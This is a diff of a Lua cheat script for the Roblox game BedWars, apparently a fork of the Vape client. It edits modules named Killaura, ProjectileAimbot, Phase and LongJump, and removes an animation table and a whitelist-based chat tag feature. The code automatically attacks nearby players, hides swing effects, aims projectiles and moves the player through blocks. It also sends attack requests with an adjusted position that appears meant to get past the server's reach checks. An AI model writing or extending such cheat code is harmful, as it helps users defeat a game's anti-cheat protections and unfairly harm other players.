-				{CFrame = {X = 0.8, Y = -0.7, Z = 0.6, Angle = CFrame.Angles(math.rad(-40), math.rad(65), math.rad(-90))},Time = 0.15, RealDelay = 0.15},
-				{CFrame = {X = 0.6, Y = -0.6, Z = 0.5, Angle = CFrame.Angles(math.rad(-45), math.rad(50), math.rad(-105))},Time = 0.1, RealDelay = 0.1},
-			},
-		},
-		--[=[Aritum = { -- can't really fix it for vape w/ out changing the entire src of it
-			Anim1 = {
-				{CFrame = {X = 0.3, Y = 0, Z = 0, Angle = CFrame.Angles(math.rad(-2), math.rad(5), math.rad(25))},Time = 0.01, RealDelay = 0.05},
-				{CFrame = {X = 5.5, Y = -5, Z = 1.5, Angle = CFrame.Angles(math.rad(-2), math.rad(5), math.rad(25))},Time = 0.2, RealDelay = 0.2},
-			},
-			Anim2 = {
-				{CFrame = {X = -0.5, Y = 0, Z = -1, Angle = CFrame.Angles(math.rad(-2), math.rad(4), math.rad(20))},Time = 0.01, RealDelay = 0.05},
-				{CFrame = {X = 4, Y = -5, Z = 0.5, Angle = CFrame.Angles(math.rad(-4), math.rad(2), math.rad(20))},Time = 0.2, RealDelay = 0.2},
-			},
-			Anim3 = {
-				{CFrame = {X = -5, Y = 0, Z = 0, Angle = CFrame.Angles(math.rad(-2), math.rad(-4), math.rad(10))},Time = 0.01, RealDelay = 0.05},
-				{CFrame = {X = -6, Y = -5, Z = 0.5, Angle = CFrame.Angles(math.rad(-4), math.rad(-2), math.rad(10))},Time = 0.2, RealDelay = 0.2},
-			},
-			Anim4 = {
-				{CFrame = {X = -2, Y = 0, Z = 1, Angle = CFrame.Angles(math.rad(-15), math.rad(-7), math.rad(5))},Time = 0.01, RealDelay = 0.05},
-				{CFrame = {X = -0, Y = -5, Z = 4, Angle = CFrame.Angles(math.rad(-10), math.rad(-4), math.rad(-2))},Time = 0.2, RealDelay = 0.2},
-			},
-			Anim4 = {
-				{CFrame = {X = -5, Y = 0, Z = -1, Angle = CFrame.Angles(math.rad(-2), math.rad(-8), math.rad(-30))},Time = 0.01, RealDelay = 0.05},
-				{CFrame = {X = -10, Y = -5, Z = -1, Angle = CFrame.Angles(math.rad(-2), math.rad(-8), math.rad(-30))},Time = 0.2, RealDelay = 0.2},
-			},
-		},]=]
-		Swong = {
-			["Main"] = {
-				{CFrame = {X = 0, Y = 0, Z = -0.6, Angle = CFrame.Angles(math.rad(-60), math.rad(50), math.rad(-70))},Time = 0.1, RealDelay = 0.1},
-				{CFrame = {X = 0, Y = -0.3, Z = -0.6, Angle = CFrame.Angles(math.rad(-160), math.rad(60), math.rad(10))},Time = 0.2, RealDelay = 0.2},
-			},
-		},
-		Extend = {
-			["Main"] = {
-				{CFrame = {X = 1.4, Y = 0, Z = -0.6, Angle = CFrame.Angles(math.rad(-60), math.rad(50), math.rad(-70))},Time = 0.26, RealDelay = 0.26},
-				{CFrame = {X = 1.6, Y = -0.3, Z = -0.4, Angle = CFrame.Angles(math.rad(-160), math.rad(60), math.rad(10))},Time = 0.16, RealDelay = 0.16},
-			},
-		},
-		Rise = {
-			["Main"] = {
-				{CFrame = {X = 0.9, Y = 0, Z = 0, Angle = CFrame.Angles(math.rad(-80), math.rad(60), math.rad(-40))},Time = 0.14, RealDelay = 0.14},
-				{CFrame = {X = 0.5, Y = -0.2, Z = -0.7, Angle = CFrame.Angles(math.rad(-150), math.rad(55), math.rad(20))},Time = 0.14, RealDelay = 0.14},
-			},
-		},
-		BlockHit2 = {
-			{CFrame = {X = 0.7, Y = -0.7, Z = 0.2, Angle = CFrame.Angles(math.rad(-90), math.rad(60), math.rad(-60))},Time = 0.17, RealDelay = 0.17},
-			{CFrame = {X = 0.5, Y = -0.9, Z = -0.5, Angle = CFrame.Angles(math.rad(-160), math.rad(60), math.rad(-30))},Time = 0.13, RealDelay = 0.13},
-			{CFrame = {X = 0.5, Y = -1.1, Z = 0.3, Angle = CFrame.Angles(math.rad(-180), math.rad(60), math.rad(-30))},Time = 0.08, RealDelay = 0.08},
-		},
-		BlockHit = {
-			["Main"] = {
-				{CFrame = {X = 0.7, Y = -0.7, Z = 0.2, Angle = CFrame.Angles(math.rad(-60), math.rad(60), math.rad(-70))},Time = 0.15, RealDelay = 0.15},
-				{CFrame = {X = 0.5, Y = -0.7, Z = -0.6, Angle = CFrame.Angles(math.rad(-120), math.rad(60), math.rad(-50))},Time = 0.15, RealDelay = 0.15},
-			},
-		},
-		Push = {
-			["Main"] = {
-				{CFrame = {X = 0.2, Y = -0.7, Z = 0, Angle = CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80))},Time = 0.2, RealDelay = 0.2},
-				{CFrame = {X = 0.2, Y = -1, Z = 0, Angle = CFrame.Angles(math.rad(23), math.rad(67), math.rad(-111))},Time = 0.35, RealDelay = 0.35},
-			},
-		},
-		["Slide"] = {
-			{CFrame = {X = 0.2, Y = -0.7, Z = 0, Angle = CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80))},Time = 0.15, RealDelay = 0.15},
-			{CFrame = {X = 0.2, Y = -1, Z = 0, Angle = CFrame.Angles(math.rad(23), math.rad(67), math.rad(-111))},Time = 0.3, RealDelay = 0.3},
-			{CFrame = {X = 0.2, Y = -1, Z = -10, Angle = CFrame.Angles(math.rad(23), math.rad(67), math.rad(-111))},Time = 0.0, RealDelay = 0.0},
-			{CFrame = {X = 0.2, Y = -0.7, Z = 0, Angle = CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80))},Time = 0.1, RealDelay = 0.1},
-			{CFrame = {X = 0.2, Y = -1, Z = 0, Angle = CFrame.Angles(math.rad(23), math.rad(67), math.rad(-111))},Time = 0.3, RealDelay = 0.3},
-		},
-		["Smooth"] = {
-			{CFrame = {X = 1, Y = 0, Z = -0.5, Angle = CFrame.Angles(math.rad(-90), math.rad(60), math.rad(-60))},Time = 0.2, RealDelay = 0.2},
-			{CFrame = {X = 1, Y = -0.2, Z = -0.5, Angle = CFrame.Angles(math.rad(-160), math.rad(60), math.rad(-30))},Time = 0.12, RealDelay = 0.12},
-		},
-		["Exhi2"] = {
-			{CFrame = {X = 1, Y = 0, Z = 0, Angle = CFrame.Angles(math.rad(-40), math.rad(40), math.rad(-80))},Time = 0.12, RealDelay = 0.12},
-			{CFrame = {X = 1, Y = 0, Z = -0.3, Angle = CFrame.Angles(math.rad(-80), math.rad(40), math.rad(-60))},Time = 0.16, RealDelay = 0.16,},
-		},
-		["Slide2"] = {
-			{CFrame = {X = 0.7, Y = -0.7, Z = 0.6, Angle = CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80))},Time = 0, RealDelay = 0},
-			{CFrame = {X = 0.7, Y = -0.7, Z = 0.6, Angle = CFrame.Angles(math.rad(-171), math.rad(47), math.rad(74))},Time = 0.16, RealDelay = 0.16}
-		},
-		["Butter"] = {
-			{CFrame = {X = 3.0, Y = -1.7, Z = -1.1, Angle = CFrame.Angles(math.rad(307), math.rad(57), math.rad(145))}, Time = 0.18, RealDelay = 0.18},
-			{CFrame = {X = 3.0, Y = -1.7, Z = -1.3, Angle = CFrame.Angles(math.rad(203), math.rad(57), math.rad(226))}, Time = 0.14, RealDelay = 0.14},
-		},
-		["Slash"] = {
-			{CFrame = {X = 0.7, Y = -0.7, Z = 0.6, Angle = CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80))}, Time = 0.01, RealDelay = 0.01},
-			{CFrame = {X = -1.71, Y = -1.11, Z = -0.94, Angle = CFrame.Angles(math.rad(-105), math.rad(85), math.rad(7))}, Time = 0.19, RealDelay = 0.19}
-		},
-		["AstralOld"] = {
-			["Main"] = {
-				{CFrame = {X = 0.8, Y = -1.7, Z = -1.8, Angle = CFrame.Angles(-math.rad(190), math.rad(70), -math.rad(90))}, Time = 0.18, RealDelay = 0.18},
-				{CFrame = {X = 0.7, Y = -1.3, Z = 0.1, Angle = CFrame.Angles(-math.rad(190), math.rad(110), -math.rad(90))}, Time = 0.18, RealDelay = 0.18},
-			},
-		},
-		["Cockless"] = {
-			["Main"] = {
-				{CFrame = {X = 2, Y = -2.5, Z = 0.2, Angle = CFrame.Angles(math.rad(268), math.rad(54), math.rad(327))}, Time = 0.17, RealDelay = 0.17},
-				{CFrame = {X = 1.6, Y = -2.5, Z = 0.2, Angle = CFrame.Angles(math.rad(189), math.rad(52), math.rad(347))}, Time = 0.16, RealDelay = 0.16},
-			},
-		},
-		["Stab"] = {
-			["Main"] = {
-				{CFrame = {X = 0.5, Y = -4, Z = -0.1, Angle = CFrame.Angles(math.rad(273), math.rad(0), math.rad(282))}, Time = 0.3, RealDelay = 0.3},
-				{CFrame = {X = 0.5, Y = 2, Z = -0.1, Angle = CFrame.Angles(math.rad(273), math.rad(0), math.rad(282))}, Time = 0.6, RealDelay = 0.5},
-			},
-		},
-		["Sigma"] = {
-			["Main"] = {
-				{CFrame = {X = 0.3, Y = -0.8, Z = -1.3, Angle = CFrame.Angles(math.rad(160), math.rad(84), math.rad(90))}, Time = 0.18, RealDelay = 0.16},
-				{CFrame = {X = 0.3, Y = -0.9, Z = -1.17, Angle = CFrame.Angles(math.rad(160), math.rad(70), math.rad(90))}, Time = 0.18, RealDelay = 0.16},
-				{CFrame = {X = 0.4, Y = -0.65, Z = -0.8, Angle = CFrame.Angles(math.rad(160), math.rad(111), math.rad(90))}, Time = 0.18, RealDelay = 0.16},
-			},
-		},
-		["Sigma2"] = {
-			["Main"] = {
-				{CFrame = {X = 0.2, Y = 0, Z = -1.3, Angle = CFrame.Angles(math.rad(111), math.rad(111), math.rad(130))}, Time = 0.18, RealDelay = 0.16},
-				{CFrame = {X = 0, Y = -0.2, Z = -1.7, Angle = CFrame.Angles(math.rad(30), math.rad(111), math.rad(190))}, Time = 0.18, RealDelay = 0.16},
-			},
-		},
-		["Drop"] = {
-			["Main"] = {
-				{CFrame = {X = -0.4, Y = -0.7, Z = -1.3, Angle = CFrame.Angles(math.rad(111), math.rad(111), math.rad(130))}, Time = 0.23, RealDelay = 0.23},
-				{CFrame = {X = -0.8, Y = -0.9, Z = -1.7, Angle = CFrame.Angles(math.rad(20), math.rad(130), math.rad(180))}, Time = 0.23, RealDelay = 0.23},
-				{CFrame = {X = -0.4, Y = -0.7, Z = -1.3, Angle = CFrame.Angles(math.rad(111), math.rad(111), math.rad(130))}, Time = 0.23, RealDelay = 0.23},
-				{CFrame = {X = -0.8, Y = -0.9, Z = -1.7, Angle = CFrame.Angles(math.rad(20), math.rad(130), math.rad(180))}, Time = 0.23, RealDelay = 0.23},
-				{CFrame = {X = -0.8, Y = -0.6, Z = -1, Angle = CFrame.Angles(math.rad(20), math.rad(130), math.rad(180))}, Time = 0.19, RealDelay = 0.19},
-			},
-		},
-		["Dortware2"] = {
-			["First"] = {
-				{CFrame = {X = -0.3, Y = -0.53, Z = -0.6, Angle = CFrame.Angles(math.rad(160), math.rad(127), math.rad(90))}, Time = 0.1, RealDelay = 0.1},
-			},
-			["Main"] = {
-				{CFrame = {X = -0.3, Y = -0.53, Z = -0.6, Angle = CFrame.Angles(math.rad(160), math.rad(127), math.rad(90))}, Time = 0.6, RealDelay = 0.13},
-				--{CFrame = {X = -0.3, Y = -0.53, Z = -0.6, Angle = CFrame.Angles(math.rad(160), math.rad(127), math.rad(90))}, Time = 0.6, RealDelay = 0.03},
-				{CFrame = {X = -0.27, Y = -0.8, Z = -1.2, Angle = CFrame.Angles(math.rad(160), math.rad(90), math.rad(90))}, Time = 0.8, RealDelay = 0.13},
-				--{CFrame = {X = -0.27, Y = -0.8, Z = -1.2, Angle = CFrame.Angles(math.rad(160), math.rad(80), math.rad(90))}, Time = 1.2, RealDelay = 0.07},
-				{CFrame = {X = -0.01, Y = -0.65, Z = -0.8, Angle = CFrame.Angles(math.rad(160), math.rad(111), math.rad(90))}, Time = 0.6, RealDelay = 0.13},
-				--{CFrame = {X = -0.01, Y = -0.65, Z = -0.8, Angle = CFrame.Angles(math.rad(160), math.rad(111), math.rad(90))}, Time = 0.6, RealDelay = 0.03}
-			},
-		},
-	}
-
-	local function portAnim(placeholder, anim)
-		for _, tween in next, placeholder do
-			if type(tween.CFrame) == "table" then
-				table.insert(anim, {
-					CFrame = CFrame.new(tween.CFrame.X, tween.CFrame.Y, tween.CFrame.Z) * tween.CFrame.Angle,
-					Time = tween.RealDelay
-				})
-			else
-				table.insert(anim, tween)
-			end
-		end
-	end
-
-	for name, placeholder in next, meteorAnimations do
-		if anims[name] == nil then
-			anims[name] = {}
-		end
-		if placeholder.Main then
-			portAnim(placeholder.Main, anims[name])
-		else
-			portAnim(placeholder, anims[name])
-		end
-	end
 
 	local function closestpos(block, pos)
 		local blockpos = block:GetRenderCFrame()
@@ -3975,17 +3684,6 @@ runFunction(function()
 		until (not Killaura.Enabled) or (not killauraautoblock.Enabled)
 	end
 
-	local lastAttack = tick()
-
-	local noPlay = {
-		[15] = true,
-		[168] = true,
-		[384] = true,
-		[385] = true,
-		[387] = true,
-		[389] = true
-	}
-
     Killaura = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
         Name = "Killaura",
         Function = function(callback)
@@ -3999,15 +3697,15 @@ runFunction(function()
 					repeat
 						task.wait()
 						if (killauraanimation.Enabled and not killauraswing.Enabled) then
-							if _VapeApi.killauraNearPlayer then
+							if killauraNearPlayer then
 								pcall(function()
 									if originalArmC0 == nil then
 										originalArmC0 = gameCamera.Viewmodel.RightHand.RightWrist.C0
 									end
 									if killauraplaying == false then
 										killauraplaying = true
-										for i,v in next, (anims[killauraanimmethod.Value]) do 
-											if (not Killaura.Enabled) or ((tick() - lastAttack > 0.6) and not _VapeApi.killauraNearPlayer) then break end
+										for i,v in pairs(anims[killauraanimmethod.Value]) do 
+											if (not Killaura.Enabled) or (not killauraNearPlayer) then break end
 											if not oldNearPlayer and killauraanimationtween.Enabled then
 												gameCamera.Viewmodel.RightHand.RightWrist.C0 = originalArmC0 * v.CFrame
 												continue
@@ -4020,7 +3718,7 @@ runFunction(function()
 									end
 								end)	
 							end
-							oldNearPlayer = _VapeApi.killauraNearPlayer
+							oldNearPlayer = killauraNearPlayer
 						end
 					until Killaura.Enabled == false
 				end)
@@ -4028,13 +3726,16 @@ runFunction(function()
                 oldViewmodelAnimation = bedwars.ViewmodelController.playAnimation
                 oldPlaySound = bedwars.SoundManager.playSound
                 bedwars.SoundManager.playSound = function(tab, soundid, ...)
-                    if (soundid == bedwars.SoundList.SWORD_SWING_1 or soundid == bedwars.SoundList.SWORD_SWING_2) and Killaura.Enabled and killaurasound.Enabled and _VapeApi.killauraNearPlayer then
+                    if (soundid == bedwars.SoundList.SWORD_SWING_1 or soundid == bedwars.SoundList.SWORD_SWING_2) and Killaura.Enabled and killaurasound.Enabled and killauraNearPlayer then
                         return nil
                     end
                     return oldPlaySound(tab, soundid, ...)
                 end
                 bedwars.ViewmodelController.playAnimation = function(Self, id, ...)
-                    if noPlay[id] and _VapeApi.killauraNearPlayer and (killauraswing.Enabled or killauraanimation.Enabled) and entityLibrary.isAlive then
+                    if id == 15 and killauraNearPlayer and killauraswing.Enabled and entityLibrary.isAlive then
+                        return nil
+                    end
+                    if id == 15 and killauraNearPlayer and killauraanimation.Enabled and entityLibrary.isAlive then
                         return nil
                     end
                     return oldViewmodelAnimation(Self, id, ...)
@@ -4042,7 +3743,7 @@ runFunction(function()
 
 				local targetedPlayer
 				RunLoops:BindToHeartbeat("Killaura", function()
-					for i,v in next, (killauraboxes) do
+					for i,v in pairs(killauraboxes) do 
 						if v:IsA("BoxHandleAdornment") and v.Adornee then
 							local cf = v.Adornee and v.Adornee.CFrame
 							local onex, oney, onez = cf:ToEulerAnglesXYZ() 
@@ -4094,29 +3795,27 @@ runFunction(function()
 				end
                 task.spawn(function()
 					repeat
-						task.wait(ReducePackets.Enabled and ReduceKillAura.Enabled and 0.04 or 0) -- modification
+						task.wait()
 						if not Killaura.Enabled then break end
-						local plrs = AllNearPosition(killaurarange.Value, 1, killaurasortmethods[killaurasortmethod.Value], true)
+						vapeTargetInfo.Targets.Killaura = nil
+						local plrs = AllNearPosition(killaurarange.Value, 10, killaurasortmethods[killaurasortmethod.Value], true)
 						local firstPlayerNear
 						if #plrs > 0 then
 							local sword, swordmeta = getAttackData()
 							if sword then
 								switchItem(sword.tool)
-								for i, plr in next, (plrs) do
-									if (tick() - lastAttack) < 0.18 then
-										continue
-									end
+								for i, plr in pairs(plrs) do
 									local root = plr.RootPart
 									if not root then 
 										continue
 									end
-									local selfroot = (shared.pingbypassroot or entityLibrary.character.HumanoidRootPart)
-									local localfacing = selfroot.CFrame.lookVector
-									local vec = (plr.RootPart.Position - selfroot.Position).unit
+									local localfacing = entityLibrary.character.HumanoidRootPart.CFrame.lookVector
+									local vec = (plr.RootPart.Position - entityLibrary.character.HumanoidRootPart.Position).unit
 									local angle = math.acos(localfacing:Dot(vec))
 									if angle >= (math.rad(killauraangle.Value) / 2) then
 										continue
 									end
+									local selfrootpos = entityLibrary.character.HumanoidRootPart.Position
 									if killauratargetframe.Walls.Enabled then
 										if not bedwars.SwordController:canSee({player = plr.Player, getInstance = function() return plr.Character end}) then continue end
 									end
@@ -4128,7 +3827,7 @@ runFunction(function()
 									end
 									if not firstPlayerNear then 
 										firstPlayerNear = true 
-										_VapeApi.killauraNearPlayer = true
+										killauraNearPlayer = true
 										targetedPlayer = plr
 										vapeTargetInfo.Targets.Killaura = {
 											Humanoid = {
@@ -4142,15 +3841,21 @@ runFunction(function()
 											if not killauraswing.Enabled then 
 												bedwars.SwordController:playSwordEffect(swordmeta, false)
 											end
-											if not killauraswing.Enabled and swordmeta.displayName:find(" Scythe") then 
+											if swordmeta.displayName:find(" Scythe") then 
 												bedwars.ScytheController:playLocalAnimation()
 											end
 										end
 									end
-									local selfpos = selfroot.Position + (killaurarange.Value > 14 and (selfroot.Position - root.Position).magnitude > 14.4 and (CFrame.lookAt(selfroot.Position, root.Position).lookVector * ((selfroot.Position - root.Position).magnitude - 14)) or Vector3.zero)
+									if (workspace:GetServerTimeNow() - bedwars.SwordController.lastAttack) < 0.02 then 
+										break
+									end
+									local selfpos = selfrootpos + (killaurarange.Value > 14 and (selfrootpos - root.Position).magnitude > 14.4 and (CFrame.lookAt(selfrootpos, root.Position).lookVector * ((selfrootpos - root.Position).magnitude - 14)) or Vector3.zero)
+									bedwars.SwordController.lastAttack = workspace:GetServerTimeNow()
+									bedwarsStore.attackReach = math.floor((selfrootpos - root.Position).magnitude * 100) / 100
+									bedwarsStore.attackReachUpdate = tick() + 1
 									killaurarealremote:FireServer({
 										weapon = sword.tool,
-										chargedAttack = {chargeRatio = swordmeta.sword.chargedAttack and not swordmeta.sword.chargedAttack.disableOnGrounded and 0.9999 or 0},
+										chargedAttack = {chargeRatio = swordmeta.sword.chargedAttack and not swordmeta.sword.chargedAttack.disableOnGrounded and 0.999 or 0},
 										entityInstance = plr.Character,
 										validate = {
 											raycast = {
@@ -4161,39 +3866,31 @@ runFunction(function()
 											selfPosition = attackValue(selfpos)
 										}
 									})
-									lastAttack = tick()
-									bedwars.SwordController.lastAttack = workspace:GetServerTimeNow()
-									bedwarsStore.attackReach = math.floor((selfroot.Position - root.Position).magnitude * 100) / 100
-									bedwarsStore.attackReachUpdate = tick() + 1
 									break
 								end
 							end
-						else
-							vapeTargetInfo.Targets.Killaura = nil
 						end
 						if not firstPlayerNear then 
 							targetedPlayer = nil
-							_VapeApi.killauraNearPlayer = false
+							killauraNearPlayer = false
 							pcall(function()
-								if (tick() - lastAttack > 0.6) then
-									if originalArmC0 == nil then
-										originalArmC0 = gameCamera.Viewmodel.RightHand.RightWrist.C0
-									end
-									if gameCamera.Viewmodel.RightHand.RightWrist.C0 ~= originalArmC0 then
-										pcall(function()
-											killauracurrentanim:Cancel()
-										end)
-										if killauraanimationtween.Enabled then 
-											gameCamera.Viewmodel.RightHand.RightWrist.C0 = originalArmC0
-										else
-											killauracurrentanim = tweenService:Create(gameCamera.Viewmodel.RightHand.RightWrist, TweenInfo.new(0.1), {C0 = originalArmC0})
-											killauracurrentanim:Play()
-										end
+								if originalArmC0 == nil then
+									originalArmC0 = gameCamera.Viewmodel.RightHand.RightWrist.C0
+								end
+								if gameCamera.Viewmodel.RightHand.RightWrist.C0 ~= originalArmC0 then
+									pcall(function()
+										killauracurrentanim:Cancel()
+									end)
+									if killauraanimationtween.Enabled then 
+										gameCamera.Viewmodel.RightHand.RightWrist.C0 = originalArmC0
+									else
+										killauracurrentanim = tweenService:Create(gameCamera.Viewmodel.RightHand.RightWrist, TweenInfo.new(0.1), {C0 = originalArmC0})
+										killauracurrentanim:Play()
 									end
 								end
 							end)
 						end
-						for i,v in next, (killauraboxes) do 
+						for i,v in pairs(killauraboxes) do 
 							local attacked = killauratarget.Enabled and plrs[i] or nil
 							v.Adornee = attacked and ((not killauratargethighlight.Enabled) and attacked.RootPart or (not GuiLibrary.ObjectsThatCanBeSaved.ChamsOptionsButton.Api.Enabled) and attacked.Character or nil)
 						end
@@ -4202,8 +3899,8 @@ runFunction(function()
             else
 				vapeTargetInfo.Targets.Killaura = nil
 				RunLoops:UnbindFromHeartbeat("Killaura") 
-                _VapeApi.killauraNearPlayer = false
-				for i,v in next, (killauraboxes) do v.Adornee = nil end
+                killauraNearPlayer = false
+				for i,v in pairs(killauraboxes) do v.Adornee = nil end
 				if killauraaimcirclepart then killauraaimcirclepart.Parent = nil end
 				if killaurarangecirclepart then killaurarangecirclepart.Parent = nil end
 				if killauraparticlepart then killauraparticlepart.Parent = nil end
@@ -4242,10 +3939,10 @@ runFunction(function()
     })
     killauratargetframe = Killaura.CreateTargetWindow({})
 	local sortmethods = {"Distance"}
-	for i,v in next, (killaurasortmethods) do if i ~= "Distance" then table.insert(sortmethods, i) end end
+	for i,v in pairs(killaurasortmethods) do if i ~= "Distance" then table.insert(sortmethods, i) end end
 	killaurasortmethod = Killaura.CreateDropdown({
 		Name = "Sort",
-		Function = blankFunction,
+		Function = function() end,
 		List = sortmethods
 	})
     killaurarange = Killaura.CreateSlider({
@@ -4267,7 +3964,7 @@ runFunction(function()
         Default = 360
     })
 	local animmethods = {}
-	for i,v in next, (anims) do table.insert(animmethods, i) end
+	for i,v in pairs(anims) do table.insert(animmethods, i) end
     killauraanimmethod = Killaura.CreateDropdown({
         Name = "Animation", 
         List = animmethods,
@@ -4319,13 +4016,13 @@ runFunction(function()
 	})
     killauramouse = Killaura.CreateToggle({
         Name = "Require mouse down",
-        Function = blankFunction,
+        Function = function() end,
 		HoverText = "Only attacks when left click is held.",
         Default = false
     })
     killauragui = Killaura.CreateToggle({
         Name = "GUI Check",
-        Function = blankFunction,
+        Function = function() end,
 		HoverText = "Attacks when you are not in a GUI."
     })
     killauratarget = Killaura.CreateToggle({
@@ -4340,7 +4037,7 @@ runFunction(function()
 	killauratargethighlight = Killaura.CreateToggle({
 		Name = "Use New Highlight",
 		Function = function(callback) 
-			for i,v in next, (killauraboxes) do 
+			for i,v in pairs(killauraboxes) do 
 				v:Remove()
 			end
 			for i = 1, 10 do 
@@ -4373,7 +4070,7 @@ runFunction(function()
 	killauracolor = Killaura.CreateColorSlider({
 		Name = "Target Color",
 		Function = function(hue, sat, val) 
-			for i,v in next, (killauraboxes) do 
+			for i,v in pairs(killauraboxes) do 
 				v[(killauratargethighlight.Enabled and "FillColor" or "Color3")] = Color3.fromHSV(hue, sat, val)
 			end
 			if killauraaimcirclepart then 
@@ -4398,7 +4095,7 @@ runFunction(function()
 	end
     killauracframe = Killaura.CreateToggle({
         Name = "Face target",
-        Function = blankFunction,
+        Function = function() end,
 		HoverText = "Makes your character face the opponent."
     })
 	killaurarangecircle = Killaura.CreateToggle({
@@ -4477,17 +4174,17 @@ runFunction(function()
 	})
     killaurasound = Killaura.CreateToggle({
         Name = "No Swing Sound",
-        Function = blankFunction,
+        Function = function() end,
 		HoverText = "Removes the swinging sound."
     })
     killauraswing = Killaura.CreateToggle({
         Name = "No Swing",
-        Function = blankFunction,
+        Function = function() end,
 		HoverText = "Removes the swinging animation."
     })
     killaurahandcheck = Killaura.CreateToggle({
         Name = "Limit to items",
-        Function = blankFunction,
+        Function = function() end,
 		HoverText = "Only attacks when your sword is held."
     })
     killauraanimation = Killaura.CreateToggle({
@@ -4499,18 +4196,18 @@ runFunction(function()
     })
 	killauraanimationtween = Killaura.CreateToggle({
 		Name = "No Tween",
-		Function = blankFunction,
+		Function = function() end,
 		HoverText = "Disable's the in and out ease"
 	})
 	killauraanimationtween.Object.Visible = false
 	killaurasync = Killaura.CreateToggle({
         Name = "Synced Animation",
-        Function = blankFunction,
+        Function = function() end,
 		HoverText = "Times animation with hit attempt"
     })
 	killauranovape = Killaura.CreateToggle({
 		Name = "No Vape",
-		Function = blankFunction,
+		Function = function() end,
 		HoverText = "no hit vape user"
 	})
 	killauranovape.Object.Visible = false
@@ -4720,7 +4417,7 @@ runFunction(function()
 					end)
 					local LongJumpOrigin = entityLibrary.isAlive and entityLibrary.character.HumanoidRootPart.Position
 					local tntcheck
-					for i,v in next, (damagemethods) do 
+					for i,v in pairs(damagemethods) do 
 						local item = getItem(i)
 						if item then
 							if i == "tnt" then 
@@ -4806,7 +4503,7 @@ runFunction(function()
 		Name = "Speed",
 		Min = 1,
 		Max = 52,
-		Function = blankFunction,
+		Function = function() end,
 		Default = 52
 	})
 end)
@@ -4855,8 +4552,8 @@ runFunction(function()
 	})
 end)
 
-_VapeApi.spiderActive = false
-_VapeApi.holdingshift = false
+local spiderActive = false
+local holdingshift = false
 runFunction(function()
 	local activatePhase = false
 	local oldActivatePhase = false
@@ -4881,7 +4578,7 @@ runFunction(function()
 		Function = function(callback)
 			if callback then
 				RunLoops:BindToHeartbeat("Phase", function()
-					if entityLibrary.isAlive and entityLibrary.character.Humanoid.MoveDirection ~= Vector3.zero and (not GuiLibrary.ObjectsThatCanBeSaved.SpiderOptionsButton.Api.Enabled or _VapeApi.holdingshift) then
+					if entityLibrary.isAlive and entityLibrary.character.Humanoid.MoveDirection ~= Vector3.zero and (not GuiLibrary.ObjectsThatCanBeSaved.SpiderOptionsButton.Api.Enabled or holdingshift) then
 						if PhaseDelay <= tick() then
 							raycastparameters.FilterDescendantsInstances = {bedwarsStore.blocks, collectionService:GetTagged("spawn-cage"), workspace.SpectatorPlatform}
 							local PhaseRayCheck = workspace:Raycast(entityLibrary.character.Head.CFrame.p, entityLibrary.character.Humanoid.MoveDirection * 1.15, raycastparameters)
@@ -4908,60 +4605,8 @@ runFunction(function()
 		Name = "Blocks",
 		Min = 1,
 		Max = 3,
-		Function = blankFunction
+		Function = function() end
 	})
-end)
-
-runFunction(function()
-    local chattag = {Enabled = true}
-    chattag = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
-        Name = "ChatTag",
-        Function = function(callback)
-            if callback then
-				local githubURL = "https://raw.githubusercontent.com/zackmackburnger/coolerwhitelist/main/whitelist.json"
-				local githubData = game:GetService("HttpService"):JSONDecode(game:HttpGet(githubURL))
-				
-				local textChatService = game:GetService("TextChatService")
-				local players = game:GetService("Players")
-				
-				local private = {4930903778}
-				local users = {4930903778}
-				
-				local function checkIfPrivatePlayer(userId)
-					for prefix, data in pairs(githubData) do
-						for _, id in ipairs(data.users) do
-							if id == userId then
-								return true, prefix
-							end
-						end
-					end
-					return false, nil
-				end
-				local Players = game:GetService("Players")
-				local textChatService = game:GetService("TextChatService")
-				textChatService.OnIncomingMessage = function(message)
-					local properties = Instance.new("TextChatMessageProperties")
-					if message.TextSource then
-						local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
-						local userId = tostring(message.TextSource.UserId)
-						local username2 = Players:GetNameFromUserIdAsync(userId)
-						for prefix, data in pairs(githubData) do
-							for _, id in ipairs(data.users) do
-								if id == userId then
-									properties.PrefixText = "<font color='" .. data.color .. "'>[" .. prefix .. "]</font> " .. message.PrefixText
-									return properties
-								else
-									properties.PrefixText = "<font color='#A908B5'></font> " .. message.PrefixText
-								end
-							end
-						end
-					end
-					return properties
-				end
-			end
-        end,
-        HoverText = "For Vape V4 whitelisted users only | This will not work for non whitelisted users"
-    })
 end)
 
 runFunction(function()
@@ -4969,11 +4614,6 @@ runFunction(function()
 	local BowAimbotProjectiles = {Enabled = false}
 	local BowAimbotPart = {Value = "HumanoidRootPart"}
 	local BowAimbotFOV = {Value = 1000}
-	local noveloproj = {
-		"fireball",
-		"telepearl"
-	}
-
 	local BowAimbot = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
 		Name = "ProjectileAimbot",
 		Function = function(callback)
@@ -4993,7 +4633,7 @@ runFunction(function()
 
 						local projmetatab = projmeta:getProjectileMeta()
 						local projectilePrediction = (worldmeta and projmetatab.predictionLifetimeSec or projmetatab.lifetimeSec or 3)
-						local projectileSpeed = (projmeta.projectile:find("arrow") and 240 or projmetatab.launchVelocity or 100)
+						local projectileSpeed = (projmetatab.launchVelocity or 100)
 						local gravity = (projmetatab.gravitationalAcceleration or 196.2)
 						local projectileGravity = gravity * projmeta.gravityMultiplier
 						local offsetStartPos = startPos + projmeta.fromPositionOffset
@@ -5010,7 +4650,7 @@ runFunction(function()
 						end
 
 						local shootpos, shootvelo = predictGravity(pos, plr.Character.HumanoidRootPart.Velocity, (pos - offsetStartPos).Magnitude / projectileSpeed, plr, playerGravity)
-						if table.find(noveloproj, projmeta.projectile) then
+						if projmeta.projectile == "telepearl" then
 							shootpos = pos
 							shootvelo = Vector3.zero
 						end
@@ -5039,18 +4679,18 @@ runFunction(function()
 	BowAimbotPart = BowAimbot.CreateDropdown({
 		Name = "Part",
 		List = {"HumanoidRootPart", "Head"},
-		Function = blankFunction
+		Function = function() end
 	})
